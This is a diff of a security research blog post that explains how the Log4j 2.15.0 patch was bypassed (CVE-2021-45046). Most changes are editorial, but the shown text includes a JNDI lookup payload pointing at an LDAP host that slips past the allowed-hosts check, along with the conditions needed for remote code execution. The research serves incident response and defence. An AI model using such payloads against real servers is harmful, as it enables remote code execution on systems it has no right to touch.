@@ -6,7 +6,7 @@ author:
     name: "@saldat0"
     url: "https://x.com/saldat0"
 ---
-Very shortly after the release of the patch for CVE-2021-44228, bundled by Apache as log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated as 3.7, it was later elevated to 9.0. Needless to say, it captured our attention, especially considering the incident response work we were conducting at the time. It was important for us to understand the situation to better advise our clients. There were bits and pieces of research with some screenshots of the bypass circulating the Internet, but, at the time, we didn’t really find a vulnerable environment, with good explanation and well laid out pre-requisite for the bypass to work.
+Shortly after the release of the patch for CVE-2021-44228, bundled by Apache as Log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated 3.7 and later elevated to 9.0. Needless to say, it captured our attention, especially considering the incident response work we were conducting at the time. It was important for us to understand the situation to better advise our clients. There were bits and pieces of research with some screenshots of the bypass circulating the Internet, but, at the time, we didn’t really find a vulnerable environment, with good explanation and well-laid-out prerequisites for the bypass to work.
 
 This blog goes over the research we performed from start to finish to produce a PoC and, in the process, to very precisely understand the conditions which have to be present to successfully bypass the patch to log4j in 2.15.0.
 
@@ -101,8 +101,8 @@ public synchronized <T> T lookup(final String name) throws NamingException {
 
 Assuming we were able to reach the same lookup function, our payload would need to comply with two new conditions:
 
-* **ALLOWED_HOSTS** – The host within the URL has to be approved
-* **ALLOWED_PROTOCOLS** – The protocol used for the query has to be approved
+- **ALLOWED_HOSTS** – The host within the URL has to be approved
+- **ALLOWED_PROTOCOLS** – The protocol used for the query has to be approved
 
 We managed to find a bit more information for these properties in the documentation:
 
@@ -270,4 +270,10 @@ Using payload: ${jndi:ldap://127.0.0.1#example.com/a}
 
 With this, we were able to reproduce the attack and once again be in a position to achieve RCE.
 
-Our research concluded that several important requirements have to be present to be able to bypass the patch of 2.15.0. The most important ones being 1) the ability to write within a context that 2) is used within a custom pattern in an application 3) using a broad DNS resolver.
+## Conclusion
+
+Our research confirmed that while the patch in Log4j 2.15.0 introduced stricter controls, bypassing it is possible under specific conditions, such as:
+
+1. The attacker has the ability to write within a context.
+2. If a custom pattern is being used within the application.
+3. If the application makes use of a broad DNS resolver.
